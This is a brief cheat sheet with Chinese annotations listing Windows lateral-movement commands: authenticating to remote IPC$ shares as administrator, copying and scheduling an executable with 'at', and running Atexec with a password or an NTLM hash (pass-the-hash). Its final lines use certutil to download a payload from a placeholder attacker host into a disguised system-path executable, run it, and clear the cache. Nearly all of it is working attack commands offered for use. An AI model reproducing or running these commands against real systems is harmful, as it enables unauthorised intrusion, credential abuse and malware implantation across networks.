	>net use \\192.168.1.2\ipc$ "password" /user:domain\administrator
	>copy 1.exe \\192.168.1.2\c$
	>net time \\192.168.1.2
	>at \\192.168.1.2 1:00AM c:\1.exe
	>at \\192.168.1.2 1:00AM cmd.exe /c “ipconfig >c:/1.txt”
	>type \\192.168.1.2\c$\1.txt
	查看计划任务
	>at \\192.168.1.2
	删除计划任务
	>at \\192.168.1.2 计划ID /delete
	Atexec.exe hacker/administrator:abc123@192.168.1.1 "whoami"
	Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.1.1 "whoami"
	Atexec横向批量上线（需开启445）
	>atexec.exe ./administrator:pass@10.1.1.1 "certutil.exe -urlcache -split -f http://youip.com:80/shell.txt c:/windows/debug/SysDug.exe" 
	>atexec.exe ./administrator:pass@10.1.1.1 "c:/windows/debug/SysDug.exe" 
	>atexec.exe ./administrator:pass@10.1.1.1 "certutil.exe -urlcache -split -f c:/windows/debug/SysDug.exe delete"
